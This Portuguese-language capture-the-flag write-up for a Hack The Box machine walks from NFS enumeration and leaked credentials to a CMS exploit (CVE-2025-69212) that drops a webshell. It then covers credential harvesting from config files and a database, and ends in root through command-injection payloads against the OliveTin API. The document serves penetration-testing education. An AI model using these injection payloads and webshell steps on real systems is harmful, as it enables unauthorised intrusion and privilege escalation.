#ctfs 

# Coleta de Informações

Primeiro começamos com um scan completo via `nmap`

```shell
nmap 10.129.82.84 --open -Pn -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-08 22:38 -03
Nmap scan report for 10.129.82.84
Host is up (0.47s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
993/tcp   open  imaps
995/tcp   open  pop3s
2049/tcp  open  nfs
32993/tcp open  unknown
35513/tcp open  unknown
37515/tcp open  unknown
47209/tcp open  unknown
56203/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 54.57 seconds
```


Agora, vamos aprofundar um pouco mais nas portas abertas encontradas

```shell
nmap 10.129.82.84 --open -Pn -p 22,80,110,111,143,993,995,2049,32993,35513,37515,47209,56203 -sV
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-08 22:40 -03
Nmap scan report for 10.129.82.84
Host is up (0.56s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     nginx 1.24.0 (Ubuntu)
110/tcp   open  pop3     Dovecot pop3d
111/tcp   open  rpcbind  2-4 (RPC #100000)
143/tcp   open  imap     Dovecot imapd (Ubuntu)
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp   open  ssl/pop3 Dovecot pop3d
2049/tcp  open  nfs_acl  3 (RPC #100227)
32993/tcp open  mountd   1-3 (RPC #100005)
35513/tcp open  status   1 (RPC #100024)
37515/tcp open  nlockmgr 1-4 (RPC #100021)
47209/tcp open  mountd   1-3 (RPC #100005)
56203/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.80 seconds
```

# Enumeração

## Serviço Web

Observem que há uma porta 80 aberta. Vamos abrir no navegador e ver do que se trata.

![Página inicial do serviço web na porta 80](Imagens/Pasted%20image%2020260908224135.png)

O site possui um domínio próprio, vamos adicionar o domínio a `/etc/hosts`do computador e tentarmos acessar novamente

![Site acessível após adicionar o domínio ao /etc/hosts](Imagens/Pasted%20image%2020260908224244.png)

Agora temos uma página. Após verificar o código fonte percebemos que ele é somente um template estático sem nenhum link externo. Vamos analisar as tecnologias por trás do site.

```shell
└─$ whatweb http://enigma.htb/         
http://enigma.htb/ [200 OK] Country[RESERVED][ZZ], Email[support@enigma.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.82.84], Script, Title[Enigma Corp — Managed IT Solutions], nginx[1.24.0]
```

Surgiu um email de suporte, talvez nos seja útil em algum momento. Agora, exploremos diretórios e subdomínios possíveis.

```
└─$ ffuf -u http://10.129.82.84 -H "Host: FUZZ.enigma.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.82.84
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.enigma.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

:: Progress: [0/19966] :: Job [1/1] :: 0 req/sec :: Duration: [0: 

...

:: Progress: [19966/19966] :: Job [1/1] :: 201 req/sec :: Duration: [0:01:13] 
:: Errors: 0 ::
```

Nenhum subdomínio encontrado

```
└─$ feroxbuster -u http://enigma.htb/ -w /usr/share/wordlists/dirb/big.txt -C 404 -x php,txt 
                                                                 
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://enigma.htb/
 🚩  In-Scope Url          │ enigma.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirb/big.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                            
200      GET     1195l     2955w    31133c http://enigma.htb/
[####################] - 3m     61407/61407   0s      found:1       errors:0      
[####################] - 3m     61407/61407   325/s   http://enigma.htb/  
```

Nem diretórios no domínio principal. Vamos mudar nossa abordagem

## POP3

No scan nmap tínhamos um `POP3`aberto e um endereço de email no `Whatweb`. Vamos tentar um null section.

```shell
└─$ openssl s_client -connect 10.129.82.84:110 -starttls pop3 -crlf -quiet
Connecting to 10.129.82.84
Can't use SSL_get_servername
depth=0 CN=enigma
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN=enigma
verify return:1
+OK Dovecot (Ubuntu) ready.
USER support@enigma.htb
+OK
PASS ""
-ERR [AUTH] Authentication failed.
PASS
-ERR No username given.
USER support@enigma.htb
+OK
PASS
-ERR [AUTH] Authentication failed.
^C
```

OBS: O servidor exige TLS para autenticar, por isso fez-se necessário o uso do `openssl`

## RPC

Vamos enumerar via `rpcinfo`

```
└─$ rpcinfo -p 10.129.82.84                      
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  60514  mountd
    100005    1   tcp  32993  mountd
    100005    2   udp  49322  mountd
    100005    2   tcp  47209  mountd
    100005    3   udp  37815  mountd
    100005    3   tcp  56203  mountd
    100024    1   udp  40488  status
    100024    1   tcp  35513  status
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100021    1   udp  53305  nlockmgr
    100021    3   udp  53305  nlockmgr
    100021    4   udp  53305  nlockmgr
    100021    1   tcp  37515  nlockmgr
    100021    3   tcp  37515  nlockmgr
    100021    4   tcp  37515  nlockmgr
```

Achamos um mount disponível, façamos agora um `showmount`

```shell
showmount -e 10.129.82.84                       
Export list for 10.129.82.84:
/srv/nfs/onboarding *
```

Tendo um diretório exposto podemos fazer a montagem em nosso computador e verificar o que tem nele.

Após realizar a montagem podemos ver o que tinha na montagem:

```
┌──(pentecostes㉿Pentecostes)-[~/Documentos/HackTheBox/Enigma/nfs_mount]
└─$ ls
New_Employee_Access.pdf
```

Vamos abrir num leitor de PDF.

![PDF aberto contendo credenciais de acesso](Imagens/Pasted%20image%2020260908233316.png)

Temos credenciais de acesso para uma página de email na Web, agora sim podemos voltar ao navegador (após adicionar o novo subdomínio ao `/etc/hosts`.

Após fazer o login nos deparamos com o seguinte dashboard

![Dashboard do webmail após login](Imagens/Pasted%20image%2020260908233506.png)

Ao abrirmos a caixa de email nos deparamos com a seguinte mensagem

![Mensagem na caixa de email com endereços encontrados](Imagens/Pasted%20image%2020260909093649.png)

Temos, portanto, 2 endereços de email

`sarah@enigma.htb`, `it@enigma.htb` e `support@enigma.htb`

Testando o acesso para `sarah`:`[senha kevin]` o login entra!

Abramos o email que etá na caixa de entrada

![Email na caixa de entrada de sarah com nova credencial](Imagens/Pasted%20image%2020260909094018.png)

Conseguimos mais uma credencial de acesso e mais um subdomínio. Vamos acessá-lo

# Exploração

![Dashboard de configuracoes do CMS acessado](Imagens/Pasted%20image%2020260909094148.png)

Conseguimos acesso a um dashboard de configurações.

Após procurar pela aplicação descobrimos sua versão

![Versao do CMS identificada na aplicacao](Imagens/Pasted%20image%2020260909105202.png)

Com isso, podemos procurar um exploit para tal CMS. No GitHub encontramos uma prova de conceito para o [CVE-2025-69212](https://github.com/BridgerAlderson/CVE-2025-69212-PoC.git)

Após executa-lo conseguimos shell.

```shell
└─$ python exploit.py \
  -t http://support_001.enigma.htb \
  -u admin \
  -p '[senha admin]' \
  --module-id 15 \
  --plugin-id 19 \
  --webshell \
  --rce

  _______      ________    ___   ___ ___  _____         __ ___ ___  __ ___          
 / ____\ \    / /  ____|  |__ \ / _ \__ \| ____|       / // _ \__ \/_ |__ \         
| |     \ \  / /| |__ ______ ) | | | | ) | |__ ______ / /| (_) | ) || |  ) |        
| |      \ \/ / |  __|______/ /| | | |/ /|___ \______| '_ \__, |/ / | | / /         
| |____   \  /  | |____    / /_| |_| / /_ ___) |     | (_) |/ // /_ | |/ /_         
 \_____|   \/   |______|  |____|\___/____|____/       \___//_/|____||_|____|        
                                                                                    
    OpenSTAManager <= 2.9.8  |  OS Command Injection                                
    P7M File Processing — decodeP7M() exec() sink                                   
                                                                                    
  CVE-2025-69212 Proof of Concept

  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  [*] Authenticating as admin...
  [+] Authenticated successfully.
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ══════════════════════════════════════════════════════════════
  ║ WEBSHELL DEPLOYMENT
  ══════════════════════════════════════════════════════════════
  [*] Deploying: shell.php
  [*] Verifying...
  [+] Webshell deployed!
  ├─ URL: http://support_001.enigma.htb/shell.php?c=id
  └─ Parameter: c
  ══════════════════════════════════════════════════════════════


  ══════════════════════════════════════════════════════════════
  ║ INTERACTIVE SHELL
  ══════════════════════════════════════════════════════════════

  Type 'exit' to quit.

  www-data@target:/var/www/html/openstamanager$ ls
```

# Pós exploração

## Movimento lateral

Após acessar o alvo, executo uma pequena coleta de informações de modo a fazer um movimento lateral local no alvo

```shell
www-data@enigma:~/html/openstamanager$ grep -RniE 'password|passwd|secret|token|db_host|db_user|db_name' \
  config config.inc.php config.php logs 2>/dev/null
<word|passwd|secret|token|db_host|db_user|db_name' \
>   config config.inc.php config.php logs 2>/dev/null
config/csrf_config.php:31:    'tokenLength' => 10,
config/csrf_config.php:37:    'CSRFP_TOKEN' => '',
config.inc.php:22:$db_host = 'localhost';
config.inc.php:23:$db_username = 'brollin';
config.inc.php:24:$db_password = '[senha brollin]';
config.inc.php:25:$db_name = 'openstamanager';
```

Um achado precioso, conseguimos credenciais para um banco de dados. Antes disso...

```shell
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:999:988::/var/log/laurel:/bin/false
haris:x:1000:1000:,,,:/home/haris:/bin/bash
mysql:x:110:111:MySQL Server,,,:/nonexistent:/bin/false
postfix:x:111:113::/var/spool/postfix:/usr/sbin/nologin
dovecot:x:112:115:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
dovenull:x:113:116:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
kevin:x:1001:1001::/home/kevin:/usr/sbin/nologin
sarah:x:1002:1002::/home/sarah:/usr/sbin/nologin
_rpc:x:114:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:115:65534::/var/lib/nfs:/usr/sbin/nologin
it:x:1003:1003::/home/it:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
```

Ao ler `/etc/passwd`vemos que o acesso desse usuário não pertence ao computador, somente ao banco de dados, vamos explorar.

```shell
www-data@enigma:~/html$ mysql -u brollin -p'[senha brollin]' openstamanager -e 'SHOW TABLES;'
<n -p'[senha brollin]' openstamanager -e 'SHOW TABLES;'
mysql: [Warning] Using a password on the command line interface can be insecure.
Tables_in_openstamanager
an_anagrafiche
an_anagrafiche_agenti
an_assicurazione_crediti
an_mansioni
an_nazioni
an_nazioni_lang
an_pagamenti_anagrafiche

...



zz_settings
zz_settings_lang
zz_storage_adapters
zz_tasks
zz_tasks_lang
zz_tasks_logs
zz_tokens
zz_user_sedi
zz_users
zz_views
zz_views_lang
zz_widgets
zz_widgets_lang
```

Vamos explorar a tabela `zz_users`

```shell
www-data@enigma:~/html$ mysql -u brollin -p'[senha brollin]' openstamanager -e 'DESCRIBE zz_users; SELECT * FROM zz_users;'
<ger -e 'DESCRIBE zz_users; SELECT * FROM zz_users;'
mysql: [Warning] Using a password on the command line interface can be insecure.
Field   Type    Null    Key     Default Extra
id      int     NO      PRI     NULL    auto_increment
username        varchar(150)    NO      UNI     NULL
password        varchar(255)    NO              NULL
email   varchar(50)     NO              NULL
idanagrafica    int     NO              NULL
idgruppo        int     NO      MUL     NULL
enabled tinyint(1)      NO              NULL
created_at      timestamp       YES             CURRENT_TIMESTAMP       DEFAULT_GENERATED
updated_at      timestamp       YES             CURRENT_TIMESTAMP       DEFAULT_GENERATED on update CURRENT_TIMESTAMP
reset_token     varchar(255)    YES             NULL
image_file_id   int     YES             NULL
options text    NO              NULL
id      username        password        email   idanagrafica    idgruppo        enabled     created_at      updated_at      reset_token     image_file_id   options
1       admin   $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu    admin@enigma.htb    1       1       1       2026-02-18 19:26:52     2026-02-18 19:26:52NULL     NULL
2       haris   $2y$10$WHf1T79sxjsZongUKT2jGeexTkv[continuação hash]    haris@enigma.htb    1       5       1       2026-02-18 20:58:28     2026-05-26 11:07:03NULL     NULL
```

Temos credenciais em hash para serem quebrados.

Observe que `haris`é um usuário do sistema, vamos focar nessa senha.

![Hash de credenciais do usuario haris](Imagens/Pasted%20image%2020260909112322.png)

Agora voltemos ao nosso shell e tentemos o movimento lateral.

```shell
www-data@enigma:~/html$ su haris
su haris
Password: [senha haris]
whoami
haris
```

Conseguimos, vamos agora até a flag.

```shell
cd /home/haris
ls -la
total 32
drwxr-x--- 4 haris haris 4096 Jun 23 14:21 .
drwxr-xr-x 6 root  root  4096 Jun 23 14:14 ..
-rw------- 1 haris haris    0 Jun 23 14:21 .bash_history
-rw-r--r-- 1 haris haris  220 Feb 18  2026 .bash_logout
-rw-r--r-- 1 haris haris 3771 Feb 18  2026 .bashrc
drwx------ 2 haris haris 4096 Jun 23 14:14 .cache
drwx------ 3 haris haris 4096 Jun 23 14:14 mail
-rw-r--r-- 1 haris haris  807 Feb 18  2026 .profile
-rw-r----- 1 root  haris   33 Sep  9 01:37 user.txt
cat user.txt
[flag user.txt]
```

Conseguimos a primeira flag.

## Escalação de privilégios

Vamos tentar um `sudo -l`

```shell
haris@enigma:~$ sudo -l
sudo -l
[sudo] password for haris: [senha haris]

Sorry, user haris may not run sudo on enigma.
```

Mau sinal, talvez `haris` não seja o usuário final que estamos precisamos escalar.

A fim de facilitar os comandos, criei um acesso via `SSH`ao haris (que antes não possuía)

```shell
ssh -i ~/.ssh/htb_enigma haris@10.129.82.84
Last login: Wed Sep 9 15:24:57 2026 from 10.10.17.151
haris@enigma:~$ 
```

### Verificando SUID

```shell
find / -perm -4000 -type f 2>/dev/null  
/usr/bin/gpasswd  
/usr/bin/umount  
/usr/bin/chfn  
/usr/bin/fusermount3  
/usr/bin/newgrp  
/usr/bin/sudo  
/usr/bin/mount  
/usr/bin/su  
/usr/bin/chsh  
/usr/bin/passwd  
/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/usr/lib/polkit-1/polkit-agent-helper-1  
/usr/lib/openssh/ssh-keysign  
/usr/sbin/mount.nfs
```

Nada de interessante.

### Verificando CronJobs

```shell
haris@enigma:~$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
/sys/kernel/security/apparmor/.remove
/sys/kernel/security/apparmor/.replace
/sys/kernel/security/apparmor/.load
/sys/kernel/security/apparmor/.notify
/sys/kernel/security/apparmor/.access
/proc
```

### Verificando capabilities

```shell
haris@enigma:/tmp$ getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
```

Apenas do `snap-confine`ter muitas capacidades, ele não possui vetor claro de escalação de privilégios.

**OBS: a partir daqui o alvo, como resetei a máquina, passou a ser 10.129.82.84**

O alvo também não é vulnerável a exploração do Kernel como `DirtyFrag` ou `CopyFail`, vamos ter que aprofundar a abordagem.

## Verificando portas abertas.

Fiz um rápido scan no alvo e percebi que há algumas portas abertas em loopback

```shell
haris@enigma:/var/www/olivetin/assets$ ss -lntup
Netid  State   Recv-Q  Send-Q   Local Address:Port      Peer Address:Port  Process  
udp    UNCONN  0       0              0.0.0.0:39610          0.0.0.0:*              
udp    UNCONN  0       0            127.0.0.1:802            0.0.0.0:*              
udp    UNCONN  0       0              0.0.0.0:35711          0.0.0.0:*              
udp    UNCONN  0       0              0.0.0.0:42791          0.0.0.0:*              
udp    UNCONN  0       0           127.0.0.54:53             0.0.0.0:*              
udp    UNCONN  0       0        127.0.0.53%lo:53             0.0.0.0:*              
udp    UNCONN  0       0              0.0.0.0:68             0.0.0.0:*              
udp    UNCONN  0       0              0.0.0.0:41060          0.0.0.0:*              
udp    UNCONN  0       0              0.0.0.0:111            0.0.0.0:*              
udp    UNCONN  0       0              0.0.0.0:43123          0.0.0.0:*              
udp    UNCONN  0       0                 [::]:57967             [::]:*              
udp    UNCONN  0       0                 [::]:34138             [::]:*              
udp    UNCONN  0       0                 [::]:51151             [::]:*              
udp    UNCONN  0       0                 [::]:55368             [::]:*              
udp    UNCONN  0       0                 [::]:111               [::]:*              
udp    UNCONN  0       0                 [::]:43179             [::]:*              
tcp    LISTEN  0       100            0.0.0.0:995            0.0.0.0:*              
tcp    LISTEN  0       100            0.0.0.0:993            0.0.0.0:*              
tcp    LISTEN  0       4096        127.0.0.54:53             0.0.0.0:*              
tcp    LISTEN  0       4096     127.0.0.53%lo:53             0.0.0.0:*              
tcp    LISTEN  0       4096         127.0.0.1:1337           0.0.0.0:*              
tcp    LISTEN  0       151          127.0.0.1:3306           0.0.0.0:*              
tcp    LISTEN  0       100            0.0.0.0:143            0.0.0.0:*              
tcp    LISTEN  0       4096           0.0.0.0:111            0.0.0.0:*              
tcp    LISTEN  0       100            0.0.0.0:110            0.0.0.0:*              
tcp    LISTEN  0       511            0.0.0.0:80             0.0.0.0:*              
tcp    LISTEN  0       64             0.0.0.0:2049           0.0.0.0:*              
tcp    LISTEN  0       4096           0.0.0.0:22             0.0.0.0:*              
tcp    LISTEN  0       64             0.0.0.0:43029          0.0.0.0:*              
tcp    LISTEN  0       4096           0.0.0.0:59085          0.0.0.0:*              
tcp    LISTEN  0       4096           0.0.0.0:38507          0.0.0.0:*              
tcp    LISTEN  0       4096           0.0.0.0:56815          0.0.0.0:*              
tcp    LISTEN  0       70           127.0.0.1:33060          0.0.0.0:*              
tcp    LISTEN  0       4096           0.0.0.0:33893          0.0.0.0:*              
tcp    LISTEN  0       100          127.0.0.1:25             0.0.0.0:*              
tcp    LISTEN  0       100               [::]:995               [::]:*              
tcp    LISTEN  0       100               [::]:993               [::]:*              
tcp    LISTEN  0       100              [::1]:25                [::]:*              
tcp    LISTEN  0       4096              [::]:43483             [::]:*              
tcp    LISTEN  0       4096              [::]:57719             [::]:*              
tcp    LISTEN  0       4096              [::]:41097             [::]:*              
tcp    LISTEN  0       100               [::]:143               [::]:*              
tcp    LISTEN  0       4096              [::]:111               [::]:*              
tcp    LISTEN  0       100               [::]:110               [::]:*              
tcp    LISTEN  0       511               [::]:80                [::]:*              
tcp    LISTEN  0       64                [::]:2049              [::]:*              
tcp    LISTEN  0       4096              [::]:22                [::]:*              
tcp    LISTEN  0       4096              [::]:56807             [::]:*              
tcp    LISTEN  0       64                [::]:38343             [::]:*   
```

Percebi que há uma porta estranhamente familiar aberta, a 1337. Decidi tunelar o alvo via `ligolo-ng` e verificar via `nmap`

```shell
nmap -Pn -sT -p- --min-rate 1000 240.0.0.1
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-09 14:00 -03
Warning: 240.0.0.1 giving up on port because retransmission cap hit (10).
Nmap scan report for 240.0.0.1
Host is up (0.15s latency).
Not shown: 65264 closed tcp ports (conn-refused), 254 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
993/tcp   open  imaps
995/tcp   open  pop3s
1337/tcp  open  waste
2049/tcp  open  nfs
3306/tcp  open  mysql
33060/tcp open  mysqlx
33893/tcp open  unknown
38507/tcp open  unknown
43029/tcp open  unknown
56815/tcp open  unknown
59085/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 85.99 seconds
                                                                                    
┌──(pentecostes㉿Pentecostes)-[~]
└─$ nmap -Pn -sT -p 1337 -sV --min-rate 1000 240.0.0.1
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-09 14:02 -03
Nmap scan report for 240.0.0.1
Host is up (0.51s latency).

PORT     STATE SERVICE VERSION
1337/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.93 seconds
```

Há um http server aberto, vamos acessar via navegador. 

Após fazer isso surgiu-me um dashboard do `OliveTin`, uma aplicação que já havia sido encontrada no alvo porém, sem sinais de execução

![Dashboard do OliveTin em execucao](Imagens/Pasted%20image%2020260909140857.png)

Pesquisando sobre a aplicação descobrimos o [CVE-2026-27626](https://github.com/advisories/GHSA-49gm-hh7w-wfvf). Após digitar `cat /etc/OliveTin/config.yaml` para vermos os arquivos de configuração do `OliveTin`para explorar vulnerabilidades encontramos o seguinte:

```shell
authRequireGuestsToLogin: false
defaultPermissions:
  exec: true 
```

Ou seja, não precisa de autenticação e qualquer um pode executar.

E outra

```shell
- name: db_pass
  type: password
```

Condição tal que dá bypass o safety check do CVE.

Somente isso não é o bastante, precisamos ver o JSON enviado do servidor para adaptar o payload da prova de conceito.

Fui até o dashboard novamente, `Backup Database`e enviei uma requisição para ver via `F12` o que é enviado

![Requisicao Backup Database inspecionada via DevTools (F12)](Imagens/Pasted%20image%2020260909150158.png)

Com isso, digito o comando com o payload correto

```shell
haris@enigma:/tmp$ curl -s -X POST http://127.0.0.1:1337/api/StartAction \
  -H "Content-Type: application/json" \
  -d '{"bindingId":"backup_database","arguments":[{"name":"db_user","value":"backup_svc"},{"name":"db_pass","value":"'"'"'; id > /tmp/pwned #"},{"name":"db_name","value":"production"}],"uniqueTrackingId":"1337"}'
{"executionTrackingId":"1337"}
haris@enigma:/tmp$ cat /tmp/pwned
uid=0(root) gid=0(root) groups=0(root)
```

O programa executa como root, basta ler a flag!

```shell
haris@enigma:/tmp$ curl -s -X POST http://127.0.0.1:1337/api/StartAction \
  -H "Content-Type: application/json" \
  -d '{"bindingId":"backup_database","arguments":[{"name":"db_user","value":"backup_svc"},{"name":"db_pass","value":"'"'"'; cat /root/root.txt > /tmp/flag #"},{"name":"db_name","value":"production"}],"uniqueTrackingId":"1337"}'
{"executionTrackingId":"5c5b1f00-3aca-4ff0-83dd-61f4067330f9"}
haris@enigma:/tmp$ cat /tmp/flag
[flag root.txt]
```

E assim encerra-se nosso CTF.